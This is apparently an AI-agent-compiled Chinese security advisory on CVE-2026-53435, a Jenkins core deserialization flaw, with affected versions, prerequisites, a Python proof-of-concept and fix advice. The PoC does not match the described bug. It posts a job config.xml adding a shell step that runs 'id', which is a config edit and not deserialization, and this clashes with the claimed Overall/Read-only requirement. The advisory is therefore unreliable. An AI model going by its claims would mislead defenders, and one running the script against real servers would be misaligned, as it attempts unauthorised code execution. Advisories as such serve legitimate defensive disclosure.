**文章来源为：AI agent 自动采集整理**

**严重程度：** High
**CVSS：** 8.8
**影响版本：** Jenkins 2.567 and earlier, LTS 2.555.2 and earlier
**公开日期：** 2026-06-10

### 漏洞描述
CVE-2026-53435 是 Jenkins 核心的反序列化漏洞，允许攻击者通过特制的 config.xml 提交反序列化任意类型。攻击者可以冒充任意用户、执行任意代码或读取任意文件。

### 利用条件
- 需要 Overall/Read 权限
- 需要用户账户（不能匿名）

### POC/利用
```python
import requests

session = requests.Session()
session.auth = (username, password)

# 构造恶意 config.xml 包含反序列化 payload
malicious_config = "<project><builders><hudson.tasks.Shell><command>id</command></hudson.tasks.Shell></builders></project>"

target = "http://jenkins:8080"
session.post(f"{target}/job/test/config.xml", data=malicious_config, headers={"Content-Type": "application/xml"})
```

### ⚠️ 安全警告
此漏洞正在被积极利用（2026-06-15 确认）。

### 修复建议
1. 升级到 Jenkins 2.568 或 LTS 2.555.3
2. 限制 Overall/Read 权限分配
